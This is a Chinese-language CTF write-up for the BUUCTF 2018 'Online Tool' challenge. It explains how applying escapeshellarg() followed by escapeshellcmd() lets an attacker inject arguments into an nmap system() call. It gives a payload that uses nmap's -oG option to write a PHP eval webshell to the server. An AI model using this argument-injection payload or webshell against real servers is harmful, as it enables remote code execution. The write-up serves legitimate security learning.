# \[BUUCTF 2018]Online Tool

## \[BUUCTF 2018]Online Tool

## 考点

* Nmap使用
* escapeshellarg()+escapeshellcmd() 之殇

## wp

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

GET参数host，然后经过`escapeshellarg()`和`escapeshellcmd()`两个函数的处理，再进行命令拼接

> **`escapeshellarg()`** 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。
>
> **`escapeshellcmd()`** 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。反斜线（\）会在以下字符之前插入： <mark style="color:red;">``&#;`|*?~<>^()[]{}$\``</mark>, <mark style="color:red;">`\x0A`</mark> 和 <mark style="color:red;">`\xFF`</mark>。 <mark style="color:red;">`'`</mark> <mark style="color:red;"></mark><mark style="color:red;">和</mark> <mark style="color:red;"></mark><mark style="color:red;">`"`</mark> <mark style="color:red;"></mark><mark style="color:red;">仅在不配对儿的时候被转义</mark>。 在 Windows 平台上，<mark style="color:red;">所有这些字符以及</mark> <mark style="color:red;"></mark><mark style="color:red;">`%`</mark> <mark style="color:red;"></mark><mark style="color:red;">和</mark> <mark style="color:red;"></mark><mark style="color:red;">`!`</mark> <mark style="color:red;"></mark><mark style="color:red;">字符都会被空格代替</mark>。

先使用`curl`命令作为例子，根据这两个函数的意思，如果传入`127.0.0.1'`，那经过`escapeshellarg()`处理之后就是`'127.0.0.1'\'''`，又经过`escapeshellcmd()`处理后是`'127.0.0.1'\\''\'`，此时执行的命令如下

```php
system("curl '127.0.0.1'\\''\'");
```

就相当于在shell中执行`curl 127.0.0.1\'`，IP地址的单引号可以忽略，中间两个反斜杠转义为一个反斜杠，两个单引号连在一起为空可忽略，最后反斜杠单引号转义为单引号，与前面的反斜杠拼接在一起。

如果传入的是`127.0.0.1' -X POST -d a=1`，那么经过转义之后就是`curl 127.0.0.1\ -X POST -d a=1'`

如果传入`'127.0.0.1'`，那经过`escapeshellarg()`处理之后就是`''\''127.0.0.1'\'''`，又经过`escapeshellcmd()`处理后是`''\\''127.0.0.1'\\'''`，此时执行的命令如下

```php
system("curl ''\\''127.0.0.1'\\'''");
```

就相当于在shell中执行`curl \127.0.0.1\\`，两个单引号连在一起为空可忽略，然后两个反斜杠转义为一个反斜杠，两个单引号连在一起为空可忽略，两个反斜杠用单引号包裹相当于两个反斜杠，最后两个单引号连在一起为空可忽略。

如果传入的是`'127.0.0.1 -X POST -d a=1'`，那么经过转义之后就是`curl \127.0.0.1 -X POST -d a=1\\`

把curl换成本题的命令，命令就是`nmap -T5 -sT -Pn --host-timeout 2 -F \127.0.0.1`` `<mark style="color:red;">`-X POST -d a=1\\`</mark>，红色部分就说明可以控制参数

本题的参数含义`-T5`是使用时间模板5(最快速度扫描)，`-sT`是使用TCP进行全连接扫描，和服务器建立完整的三次握手，`-Pn`跳过主机发现，视所有主机都在线，`--host-timeout 2`是设置超时时间，`-F`是快速扫描模式，比默认的扫描端口还少。而Nmap还有输出到文件的功能，这就是可以getshell的地方。

Nmap的保存功能主要有四种，`-oN`将标准输出直接写入指定的文件，`-oX`输出XML文件，`-oS`将所有的输出都改为大写，`-oG`输出便于通过bash或者perl处理的格式，非XML，`-oA`将扫描结果以标准格式、XML格式和Grep格式一次性输出。

最后能用的只要`-oG`，payload为`' <?php eval($_POST["a"]);?> -oG shell.php '`

处理之后的命令如下

```
nmap -T5 -sT -Pn --host-timeout 2 -F ''\\'' \<\?php eval\(\$_POST\["a"\]\)\;\?\> -oG shell.php '\\'''
```

相当于

```
nmap -T5 -sT -Pn --host-timeout 2 -F \ <?php eval($_POST[a]);?> -oG shell.php \\
```

最终nmap执行的命令为

```
nmap -T5 -sT -Pn --host-timeout 2 -F -oG shell.php \ <?php eval($_POST[a]);?> \\
```

如果<mark style="color:red;">最后一个单引号前不加空格</mark>，那写入的文件就变成`shell.php\\`，是无法解析成php的。

## 小结

1. [PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)
2. 类似[\[网鼎杯 2020 朱雀组\]Nmap](wang-ding-bei-2020-zhu-que-zu-nmap.md)
